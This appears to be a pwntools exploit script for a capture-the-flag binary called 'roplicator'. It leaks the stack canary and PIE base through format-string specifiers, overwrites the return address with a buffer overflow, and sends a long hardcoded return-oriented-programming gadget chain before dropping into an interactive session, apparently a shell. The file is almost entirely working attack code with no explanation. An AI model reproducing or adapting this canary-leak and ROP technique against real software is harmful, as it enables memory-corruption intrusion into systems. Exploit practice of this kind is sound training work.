#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./roplicator', checksec=False)
libc = ELF(elf.path, checksec=False)
context.log_level = 'debug'

gdbscript = '''
    continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    if args.REMOTE:
        return remote('', 0)
    else:
        return process(elf.path)

SECRET_HASH = b'42 (forty-two) is the natural number that follows 41 and precedes 43.'

p = start()

p.sendlineafter(b'?\n', SECRET_HASH)

p.sendlineafter(b'?\n', b'%21$p')
p.recvuntil(b'about ')
canary = int(p.recvline().strip(), 16)
info('canary address: ' + hex(canary))

pay = p64(0) * 6
pay += p64(canary)
pay += p64(0)
pay += b'\x57'

p.sendafter(b'\n', pay)
p.sendlineafter(b'?\n', SECRET_HASH)

p.sendlineafter(b'?\n', b'%23$p')
p.recvuntil(b'about ')
elf.address = int(p.recvline().strip(), 16) - 0x2a55c
info('elf base address: ' + hex(elf.address))

pay = p64(0) * 6
pay += p64(canary)
pay += p64(0)
pay += b'\x57'
p.sendafter(b'\n', pay)

pie_base = 0x5649f4d36000

addresses = [
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xfb\xf5\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x4e\x6c\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xb3\x10\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x88\xc1\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x48\x79\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xd2\x16\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xc9\xad\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x0d\x0a\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x6a\x2a\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x1c\x9a\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x65\xb4\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xd5\x93\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x88\x65\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x0a\x73\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x16\xa7\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x73\x4b\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xf2\xba\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x2c\x52\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xe6\xe8\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xb6\x2a\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xe2\xfc\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x73\xef\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x3b\x79\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x4d\x5f\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x4d\xe2\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x41\x9a\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x96\xfc\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x87\xfc\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xc4\xa0\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x44\x3e\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xbd\x65\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xb6\x09\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x9c\x37\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xe6\x37\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x7f\xa0\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x3c\x86\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xcc\x23\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xb1\x1d\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x10\x8d\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x40\xc1\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xa8\xce\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x75\x79\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x5d\xb4\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x40\x93\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x05\x6c\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x3a\xa7\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x14\xc8\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x85\xce\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x8f\xc1\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x26\x24\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x04\xf6\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x97\x86\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xa9\xba\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xb7\xdb\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x52\xd5\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x53\x31\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x2d\xc8\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xda\xe8\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x5e\xa7\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x2c\x8d\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xf1\x51\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x2e\xd5\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x61\x03\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xbb\x44\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xc5\x8c\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xb2\x72\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x2c\x3e\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xbf\x72\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x5b\x10\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x96\x93\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xb8\x7f\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x7c\x4b\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x03\x31\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xcf\xe8\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x98\x58\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x6f\xe2\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xc3\x58\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xba\xdb\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x93\xad\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xdb\x99\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x92\x86\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xda\xad\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xc4\xa0\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x22\xd5\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xd7\xc7\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x2d\xf6\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x0b\x03\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x78\xef\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x04\xbb\xd3\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x0c\xb4\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x3f\x1d\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xe0\x7f\xd3\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x1a\x5f\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xf0\x7f\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xf0\x44\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x8c\xef\xd4\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\x2c\x17\xd5\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\x55\xe2\xd5\xf4\x49\x56\x00\x00',  b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',
b'\x20\x40\xd6\xf4\x49\x56\x00\x00',  b'\xea\xdb\xd4\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00',  b'\x20\x40\xd6\xf4\x49\x56\x00\x00',
b'\xab\xce\xd4\xf4\x49\x56\x00\x00',  b'\xb9\x03\xd6\xf4\x49\x56\x00\x00',
b'\xb1\x72\xd3\xf4\x49\x56\x00\x00'
]

pay = p64(0) * 15 + p64(canary) + p64(0)

for addr in addresses:
    offset = u64(addr) - pie_base
    print('offset: ' + str(hex(offset)))
    pay += p64(elf.address + offset)

offset = u64(b'\x54\x71\xd3\xf4\x49\x56\x00\x00') - pie_base
info(hex(offset))

pay += b'\x03\x00\x00\x00\x00\x00\x00\x00' + p64(elf.address + offset)

p.sendafter(b'\n', pay)
p.interactive()
